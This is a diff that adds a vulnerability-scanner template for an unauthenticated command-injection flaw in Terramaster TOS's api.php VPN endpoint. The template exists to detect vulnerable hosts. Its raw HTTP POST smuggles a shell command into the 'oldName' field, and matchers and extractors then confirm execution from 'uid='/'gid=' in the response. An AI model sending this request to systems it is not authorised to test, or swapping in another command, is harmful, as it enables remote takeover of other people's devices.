@@ -1,0 +1,36 @@
+id: terramaster-tos-vpn-rce
+info:
+  name: Terramaster TOS VPN RCE
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Terramaster TOS has a command execution vulnerability caused by inadequate verification of VPN parameters in the api.php script. An unauthenticated attacker can exploit this issue to execute arbitrary commands on the target system.
+  tags: command-execution
+  remediation: |
+    Set up whitelist access through devices such as firewalls and monitor updates on the official Terramaster website.
+  reference:
+    - https://www.terra-master.com/jp/tos/
+http:
+  - raw:
+      - |
+        POST /module/api.php?VPN/_mportVpn HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        status=edit&oldName=1|id||
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "uid="
+          - "gid="
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - "uid=(\\d+)"
+          - "gid=(\\d+)"
